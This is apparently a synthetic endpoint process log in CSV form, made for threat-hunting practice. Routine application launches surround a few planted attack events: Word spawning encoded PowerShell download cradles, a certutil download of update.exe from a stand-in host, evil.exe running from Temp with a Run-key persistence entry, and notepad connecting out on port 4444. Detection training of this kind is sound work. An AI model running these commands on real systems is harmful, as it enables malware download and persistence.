timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
2026-04-05 19:57:00,corp-ws-04,charlie,zoom.exe,explorer.exe,zoom.exe --background-task-mode,45.33.32.156,443,zoom-client
2026-04-05 19:58:00,ops-ws-02,bob,slack.exe,explorer.exe,slack.exe --background-task-mode,142.250.183.14,443,slack-client
2026-04-05 19:59:00,ops-ws-01,karen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,52.95.110.1,443,zoom-client
2026-04-05 20:00:00,corp-ws-04,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,msedge
2026-04-05 20:01:00,corp-ws-01,liam,teams.exe,explorer.exe,teams.exe --background-task-mode,23.45.67.89,443,teams-client
2026-04-05 20:01:00,fin-ws-02,liam,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-05 20:02:00,corp-ws-04,george,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-05 20:02:00,fin-ws-02,liam,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-05 20:03:00,fin-ws-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,firefox
2026-04-05 20:03:00,fin-ws-02,liam,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-05 20:04:00,eng-ws-02,george,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
2026-04-05 20:05:00,corp-ws-03,diana,teams.exe,explorer.exe,teams.exe --background-task-mode,185.199.108.153,443,teams-client
2026-04-05 20:06:00,fin-ws-01,karen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-05 20:07:00,hr-ws-01,karen,teams.exe,explorer.exe,teams.exe --background-task-mode,1.1.1.1,443,teams-client
2026-04-05 20:08:00,corp-ws-03,charlie,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-05 20:09:00,corp-ws-01,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,msedge
2026-04-05 20:10:00,eng-ws-02,karen,code.exe,explorer.exe,"code.exe ""C:\Users\karen\Documents\project""",172.16.10.8,445,none
2026-04-05 20:11:00,corp-ws-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",23.45.67.89,443,outlook
2026-04-05 20:12:00,eng-ws-02,karen,winword.exe,explorer.exe,winword.exe /background,10.2.10.15,0,none
2026-04-05 20:13:00,ops-ws-02,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-05 20:14:00,corp-ws-04,karen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,msedge
2026-04-05 20:15:00,ops-ws-02,george,winword.exe,explorer.exe,winword.exe /background,10.2.10.15,0,none
2026-04-05 20:16:00,ops-ws-01,charlie,teams.exe,explorer.exe,teams.exe --background-task-mode,8.8.8.8,443,teams-client
2026-04-05 20:17:00,corp-ws-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
2026-04-05 20:18:00,ops-ws-01,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",45.33.32.156,443,outlook
2026-04-05 20:19:00,corp-ws-02,liam,teams.exe,explorer.exe,teams.exe --background-task-mode,151.101.1.69,443,teams-client
2026-04-05 20:20:00,eng-ws-01,liam,outlook.exe,explorer.exe,"outlook.exe /recycle ""liam@company.com""",151.101.1.69,443,outlook
2026-04-05 20:21:00,fin-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",142.250.183.14,443,outlook
2026-04-05 20:22:00,eng-ws-01,bob,zoom.exe,explorer.exe,zoom.exe --background-task-mode,52.95.110.1,443,zoom-client
2026-04-05 20:23:00,sales-lt-01,irfan,teams.exe,explorer.exe,teams.exe --background-task-mode,151.101.1.69,443,teams-client
2026-04-05 20:24:00,corp-ws-01,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.2.20,445,none
2026-04-05 20:25:00,corp-ws-03,liam,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-05 20:26:00,corp-ws-04,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,msedge
2026-04-05 20:27:00,ops-ws-01,karen,slack.exe,explorer.exe,slack.exe --background-task-mode,8.8.8.8,443,slack-client
2026-04-05 20:28:00,sales-lt-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,msedge
2026-04-05 20:29:00,eng-ws-02,alice,onenote.exe,explorer.exe,onenote.exe /background,10.2.10.15,0,none
2026-04-05 20:30:00,ops-ws-01,bob,teams.exe,explorer.exe,teams.exe --background-task-mode,23.45.67.89,443,teams-client
2026-04-05 20:31:00,fin-ws-02,george,zoom.exe,explorer.exe,zoom.exe --background-task-mode,8.8.8.8,443,zoom-client
2026-04-05 20:32:00,corp-ws-03,george,slack.exe,explorer.exe,slack.exe --background-task-mode,104.18.20.12,443,slack-client
2026-04-05 20:33:00,corp-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,104.18.20.12,443,zoom-client
2026-04-05 20:34:00,corp-ws-02,george,teams.exe,explorer.exe,teams.exe --background-task-mode,185.199.108.153,443,teams-client
2026-04-05 20:35:00,sales-lt-01,liam,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,msedge
2026-04-05 20:36:00,fin-ws-01,diana,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-05 20:37:00,corp-ws-02,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,msedge
2026-04-05 20:38:00,sales-lt-01,ethan,zoom.exe,explorer.exe,zoom.exe --background-task-mode,104.18.20.12,443,zoom-client
2026-04-05 20:39:00,corp-ws-04,irfan,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-05 20:40:00,ops-ws-02,bob,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-05 20:41:00,corp-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,8.8.8.8,443,zoom-client
2026-04-05 20:42:00,ops-ws-01,bob,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-05 20:43:00,sales-lt-01,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,msedge
2026-04-05 20:44:00,ops-ws-01,irfan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\irfan\Documents\notes.txt""",10.0.0.5,0,none
2026-04-05 20:45:00,hr-ws-01,karen,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-05 20:46:00,eng-ws-02,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-05 20:47:00,eng-ws-01,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 20:48:00,corp-ws-04,george,teams.exe,explorer.exe,teams.exe --background-task-mode,45.33.32.156,443,teams-client
2026-04-05 20:49:00,sales-lt-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",45.33.32.156,443,outlook
2026-04-05 20:50:00,ops-ws-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-05 20:51:00,ops-ws-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-05 20:52:00,ops-ws-02,irfan,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-05 20:53:00,hr-ws-01,karen,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-05 20:54:00,eng-ws-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,msedge
2026-04-05 20:55:00,eng-ws-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-05 20:56:00,eng-ws-02,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",10.2.10.15,445,none
2026-04-05 20:57:00,corp-ws-02,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",172.16.10.8,445,none
2026-04-05 20:58:00,eng-ws-01,helen,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.10,0,none
2026-04-05 20:59:00,eng-ws-01,alice,teams.exe,explorer.exe,teams.exe --background-task-mode,185.199.108.153,443,teams-client
2026-04-05 21:00:00,corp-ws-01,liam,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-05 21:01:00,eng-ws-02,karen,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-05 21:02:00,sales-lt-01,farah,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-05 21:03:00,fin-ws-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.0.0.5,0,none
2026-04-05 21:04:00,ops-ws-01,farah,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-05 21:05:00,ops-ws-02,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 21:06:00,corp-ws-04,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-05 21:07:00,ops-ws-02,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",151.101.1.69,443,outlook
2026-04-05 21:08:00,eng-ws-01,karen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\karen\Documents\notes.txt""",192.168.1.12,0,none
2026-04-05 21:09:00,fin-ws-01,george,excel.exe,explorer.exe,excel.exe /background,10.2.10.15,0,none
2026-04-05 21:10:00,corp-ws-01,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",10.0.0.10,445,none
2026-04-05 21:11:00,ops-ws-01,george,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-05 21:12:00,eng-ws-02,julia,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-05 21:13:00,eng-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-05 21:13:00,eng-ws-02,george,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-05 21:14:00,ops-ws-02,george,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
2026-04-05 21:14:00,eng-ws-02,george,evil.exe,explorer.exe,C:\Users\george\AppData\Local\Temp\evil.exe,172.16.4.25,0,none
2026-04-05 21:15:00,corp-ws-01,helen,code.exe,explorer.exe,"code.exe ""C:\Users\helen\Documents\project""",10.0.1.15,445,none
2026-04-05 21:15:00,eng-ws-02,george,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.0.0.10,0,none
2026-04-05 21:16:00,ops-ws-01,charlie,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
2026-04-05 21:17:00,corp-ws-03,farah,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-05 21:18:00,fin-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,185.199.108.153,443,zoom-client
2026-04-05 21:19:00,ops-ws-01,charlie,zoom.exe,explorer.exe,zoom.exe --background-task-mode,142.250.183.14,443,zoom-client
2026-04-05 21:20:00,fin-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,msedge
2026-04-05 21:21:00,ops-ws-01,george,teams.exe,explorer.exe,teams.exe --background-task-mode,1.1.1.1,443,teams-client
2026-04-05 21:22:00,hr-ws-01,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-05 21:23:00,fin-ws-01,irfan,slack.exe,explorer.exe,slack.exe --background-task-mode,142.250.183.14,443,slack-client
2026-04-05 21:24:00,corp-ws-03,helen,slack.exe,explorer.exe,slack.exe --background-task-mode,185.199.108.153,443,slack-client
2026-04-05 21:25:00,corp-ws-04,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
2026-04-05 21:26:00,hr-ws-01,alice,zoom.exe,explorer.exe,zoom.exe --background-task-mode,142.250.183.14,443,zoom-client
2026-04-05 21:27:00,corp-ws-03,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
2026-04-05 21:28:00,eng-ws-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-05 21:29:00,corp-ws-04,liam,slack.exe,explorer.exe,slack.exe --background-task-mode,185.199.108.153,443,slack-client
2026-04-05 21:30:00,corp-ws-03,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",185.199.108.153,443,outlook
2026-04-05 21:31:00,ops-ws-01,karen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,msedge
2026-04-05 21:32:00,corp-ws-04,julia,slack.exe,explorer.exe,slack.exe --background-task-mode,142.250.183.14,443,slack-client
2026-04-05 21:33:00,corp-ws-01,helen,slack.exe,explorer.exe,slack.exe --background-task-mode,52.95.110.1,443,slack-client
2026-04-05 21:34:00,sales-lt-01,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
2026-04-05 21:35:00,corp-ws-04,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",23.45.67.89,443,outlook
2026-04-05 21:36:00,eng-ws-01,julia,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-05 21:37:00,sales-lt-01,alice,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
2026-04-05 21:38:00,ops-ws-02,bob,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
2026-04-05 21:39:00,corp-ws-03,irfan,zoom.exe,explorer.exe,zoom.exe --background-task-mode,52.95.110.1,443,zoom-client
2026-04-05 21:40:00,corp-ws-01,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,142.250.183.14,443,zoom-client
2026-04-05 21:41:00,eng-ws-02,karen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
2026-04-05 21:42:00,corp-ws-03,ethan,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-05 21:43:00,sales-lt-01,karen,slack.exe,explorer.exe,slack.exe --background-task-mode,8.8.8.8,443,slack-client
2026-04-05 21:44:00,corp-ws-01,irfan,zoom.exe,explorer.exe,zoom.exe --background-task-mode,45.33.32.156,443,zoom-client
2026-04-05 21:45:00,ops-ws-01,helen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\helen\Documents\notes.txt""",10.1.5.12,0,none
2026-04-05 21:46:00,fin-ws-01,karen,code.exe,explorer.exe,"code.exe ""C:\Users\karen\Documents\project""",10.1.5.12,445,none
2026-04-05 21:47:00,corp-ws-01,farah,slack.exe,explorer.exe,slack.exe --background-task-mode,104.18.20.12,443,slack-client
2026-04-05 21:48:00,fin-ws-01,liam,slack.exe,explorer.exe,slack.exe --background-task-mode,45.33.32.156,443,slack-client
2026-04-05 21:49:00,sales-lt-01,farah,onenote.exe,explorer.exe,onenote.exe /background,10.2.10.15,0,none
2026-04-05 21:50:00,fin-ws-02,diana,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-05 21:51:00,hr-ws-01,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,msedge
2026-04-05 21:52:00,eng-ws-02,irfan,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
2026-04-05 21:53:00,corp-ws-03,liam,code.exe,explorer.exe,"code.exe ""C:\Users\liam\Documents\project""",10.2.10.15,445,none
2026-04-05 21:54:00,corp-ws-04,bob,zoom.exe,explorer.exe,zoom.exe --background-task-mode,8.8.8.8,443,zoom-client
2026-04-05 21:55:00,fin-ws-01,george,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-05 21:56:00,sales-lt-01,karen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
2026-04-05 21:57:00,corp-ws-02,charlie,teams.exe,explorer.exe,teams.exe --background-task-mode,52.95.110.1,443,teams-client
2026-04-05 21:58:00,eng-ws-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,10.2.10.15,0,none
2026-04-05 21:59:00,ops-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",10.2.10.15,445,none
2026-04-05 22:00:00,eng-ws-02,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,151.101.1.69,443,zoom-client
2026-04-05 22:01:00,hr-ws-01,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",172.16.10.8,445,none
2026-04-05 22:02:00,sales-lt-01,liam,outlook.exe,explorer.exe,"outlook.exe /recycle ""liam@company.com""",45.33.32.156,443,outlook
2026-04-05 22:03:00,hr-ws-01,george,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-05 22:04:00,sales-lt-01,diana,outlook.exe,explorer.exe,"outlook.exe /recycle ""diana@company.com""",1.1.1.1,443,outlook
2026-04-05 22:05:00,eng-ws-01,charlie,slack.exe,explorer.exe,slack.exe --background-task-mode,45.33.32.156,443,slack-client
2026-04-05 22:06:00,hr-ws-01,karen,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-05 22:07:00,fin-ws-01,karen,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-05 22:08:00,fin-ws-01,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-05 22:09:00,sales-lt-01,karen,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-05 22:10:00,eng-ws-01,farah,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-05 22:11:00,corp-ws-02,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-05 22:12:00,corp-ws-04,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-05 22:13:00,ops-ws-01,karen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\karen\Documents\notes.txt""",192.168.1.12,0,none
2026-04-05 22:14:00,fin-ws-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",192.168.10.9,0,none
2026-04-05 22:15:00,ops-ws-02,karen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,52.95.110.1,443,zoom-client
2026-04-05 22:16:00,ops-ws-02,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",45.33.32.156,443,outlook
2026-04-05 22:17:00,fin-ws-01,julia,slack.exe,explorer.exe,slack.exe --background-task-mode,23.45.67.89,443,slack-client
2026-04-05 22:18:00,corp-ws-02,charlie,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
2026-04-05 22:19:00,corp-ws-01,alice,zoom.exe,explorer.exe,zoom.exe --background-task-mode,23.45.67.89,443,zoom-client
2026-04-05 22:20:00,eng-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-05 22:21:00,fin-ws-02,bob,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-05 22:22:00,eng-ws-01,diana,zoom.exe,explorer.exe,zoom.exe --background-task-mode,151.101.1.69,443,zoom-client
2026-04-05 22:23:00,hr-ws-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,firefox
2026-04-05 22:24:00,ops-ws-02,george,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-05 22:25:00,fin-ws-02,farah,zoom.exe,explorer.exe,zoom.exe --background-task-mode,185.199.108.153,443,zoom-client
2026-04-05 22:26:00,corp-ws-02,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",10.2.10.15,445,none
2026-04-05 22:27:00,corp-ws-01,charlie,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-05 22:28:00,ops-ws-02,karen,zoom.exe,explorer.exe,zoom.exe --background-task-mode,52.95.110.1,443,zoom-client
2026-04-05 22:29:00,fin-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",192.168.1.12,445,none
2026-04-05 22:30:00,corp-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",10.1.5.12,445,none
2026-04-05 22:31:00,sales-lt-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.1.5.12,0,none
2026-04-05 22:32:00,fin-ws-02,karen,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-05 22:33:00,corp-ws-04,helen,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-05 22:34:00,hr-ws-01,bob,slack.exe,explorer.exe,slack.exe --background-task-mode,23.45.67.89,443,slack-client
2026-04-05 22:35:00,sales-lt-01,farah,onenote.exe,explorer.exe,onenote.exe /background,10.2.10.15,0,none
2026-04-05 22:36:00,corp-ws-01,irfan,teams.exe,explorer.exe,teams.exe --background-task-mode,142.250.183.14,443,teams-client
2026-04-05 22:36:00,eng-ws-01,bob,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-05 22:37:00,sales-lt-01,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-05 22:37:00,eng-ws-01,bob,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-05 22:38:00,corp-ws-03,farah,teams.exe,explorer.exe,teams.exe --background-task-mode,8.8.8.8,443,teams-client
2026-04-05 22:39:00,hr-ws-01,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-05 22:40:00,corp-ws-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-05 22:41:00,corp-ws-04,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,msedge
2026-04-05 22:42:00,corp-ws-01,alice,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-05 22:43:00,corp-ws-01,karen,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
2026-04-05 22:44:00,hr-ws-01,karen,slack.exe,explorer.exe,slack.exe --background-task-mode,23.45.67.89,443,slack-client
2026-04-05 22:45:00,fin-ws-01,ethan,teams.exe,explorer.exe,teams.exe --background-task-mode,1.1.1.1,443,teams-client
2026-04-05 22:46:00,ops-ws-01,helen,teams.exe,explorer.exe,teams.exe --background-task-mode,151.101.1.69,443,teams-client
2026-04-05 22:47:00,eng-ws-02,diana,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 22:48:00,corp-ws-04,karen,outlook.exe,explorer.exe,"outlook.exe /recycle ""karen@company.com""",185.199.108.153,443,outlook
2026-04-05 22:49:00,ops-ws-01,diana,zoom.exe,explorer.exe,zoom.exe --background-task-mode,104.18.20.12,443,zoom-client
2026-04-05 22:50:00,hr-ws-01,irfan,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-05 22:51:00,ops-ws-02,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",192.168.1.12,0,none
2026-04-05 22:52:00,ops-ws-01,liam,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 22:53:00,fin-ws-01,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",52.95.110.1,443,outlook
2026-04-05 22:54:00,corp-ws-03,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
2026-04-05 22:55:00,eng-ws-02,alice,slack.exe,explorer.exe,slack.exe --background-task-mode,151.101.1.69,443,slack-client
2026-04-05 22:56:00,corp-ws-03,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
2026-04-05 22:57:00,ops-ws-01,george,teams.exe,explorer.exe,teams.exe --background-task-mode,45.33.32.156,443,teams-client
2026-04-05 22:58:00,eng-ws-02,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-05 22:59:00,corp-ws-02,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,msedge
2026-04-05 23:00:00,ops-ws-02,julia,teams.exe,explorer.exe,teams.exe --background-task-mode,52.95.110.1,443,teams-client
2026-04-05 23:01:00,hr-ws-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-05 23:02:00,corp-ws-03,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,msedge
2026-04-05 23:03:00,ops-ws-01,helen,slack.exe,explorer.exe,slack.exe --background-task-mode,185.199.108.153,443,slack-client
2026-04-05 23:04:00,fin-ws-01,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-05 23:05:00,eng-ws-01,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",172.16.10.8,0,none
2026-04-05 23:06:00,fin-ws-01,george,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
